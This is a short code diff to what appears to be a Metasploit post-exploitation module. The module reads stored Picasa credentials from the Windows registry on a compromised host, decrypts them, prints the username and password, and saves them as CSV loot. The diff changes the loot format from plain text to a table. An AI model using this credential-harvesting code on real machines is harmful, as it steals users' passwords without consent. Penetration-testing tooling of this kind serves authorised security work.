@@ -114,6 +114,15 @@ class Metasploit3 < Msf::Post
 			password = registry_getvaldata("HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\",
 			'GaiaPass')
 
+			credentials = Rex::Ui::Text::Table.new(
+					'Header'    => "Picasa Credentials",
+					'Indent'    => 1,
+					'Columns'   =>
+					[
+						"User",
+						"Password"
+					])
+
 			if username != nil and password != nil
 				passbin = [password].pack("H*")
 				pass = decrypt_password(passbin)
@@ -122,22 +131,17 @@ class Metasploit3 < Msf::Post
 					print_status("Username: #{username}")
 					print_status("Password: #{pass}")
 
-					secret = "#{username}:#{pass}"
-					psecrets << secret
+					credentials << [username,pass]
+					path = store_loot(
+					"picasa.creds",
+					"text/csv",
+					session,
+					credentials.to_csv,
+					"decrypted_picasa_data.csv",
+					"Decrypted Picasa Passwords")
+
+					print_status("Decrypted passwords saved in: #{path}")
 				end
-			end
-
-			# store the loot
-			if psecrets != ""
-				path = store_loot(
-				"picasa.decrypted",
-				"text/plain",
-				session,
-				psecrets,
-				"decrypted_picasa_data.txt",
-				"Decrypted Picasa Passwords")
-
-				print_status("Decrypted passwords saved in: #{path}")
 			end
 
 		rescue ::Exception => e
